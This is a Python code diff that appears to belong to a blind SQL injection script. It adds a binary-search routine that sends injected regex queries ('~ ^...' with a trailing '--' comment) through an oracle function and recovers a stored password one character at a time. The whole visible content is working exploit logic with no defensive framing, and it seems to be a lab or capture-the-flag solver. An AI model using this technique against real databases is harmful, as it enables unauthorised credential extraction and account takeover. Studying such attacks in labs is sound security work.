@@ -86,11 +86,60 @@ def LinearSearch(arr, password_length):
                 break
     return(try_password[0])
 
-if __name__ == '__main__':
-    print("Getting Length of Password String...")
-    length = DetermineLength()
-    print(f'Password Length: {length}')
+def GetMatch(try_password):
+    query = f"{query_pass} ~ '^{try_password}$'--"
+    if try_query(query) == True:
+        print(f"Found pass: {try_password}")
+        return True
+    return False
 
-    print("Finding Password...")
-    LinearSearch(characters, length)
-    print(f'Password: {try_password}')
+def BinarySearchRec(try_pass, arr, high_point, low_point):
+    if high_point >= low_point:
+        middle_point = (high_point + low_point) // 2
+
+        if try_pass is not None:
+            query = f"{query_pass} ~ '^{try_pass+arr[middle_point]}'--"
+        else:
+            query = f"{query_pass} ~ '^{arr[middle_point]}'--"
+
+        if try_query(query) == True:
+            return arr[middle_point]
+        
+        if try_pass is not None:
+            query = f"{query_pass} ~ '^{try_pass}[{arr[:middle_point]}]'--"
+        else:
+            query = f"{query_pass} ~ '^[{arr[:middle_point]}]'--"
+
+        if try_query(query) == True:
+            return BinarySearchRec(try_pass, arr, middle_point-1, low_point)
+        else:
+            return BinarySearchRec(try_pass, arr, high_point, middle_point+1)
+
+
+def BinarySearch(arr):
+    max_attempts = 50
+
+    try_pass = BinarySearchRec(None, arr, len(arr)-1, 0)
+
+    exit = False
+    while GetMatch(try_pass) == False:
+        print(try_pass)
+        if GetMatch(try_pass) == True:
+            exit = True
+        elif max_attempts == 0:
+            print("No more attempts allowed.")
+            exit = True
+        
+        try_pass += BinarySearchRec(try_pass, arr, len(arr)-1, 0)
+        max_attempts -= 1
+
+if __name__ == '__main__':
+    # print("Getting Length of Password String...")
+    # length = DetermineLength()
+    # print(f'Password Length: {length}')
+
+    # print("Finding Password...")
+    # LinearSearch(characters, length)
+    # print(f'Password: {try_password}')
+
+    BinarySearch(characters)
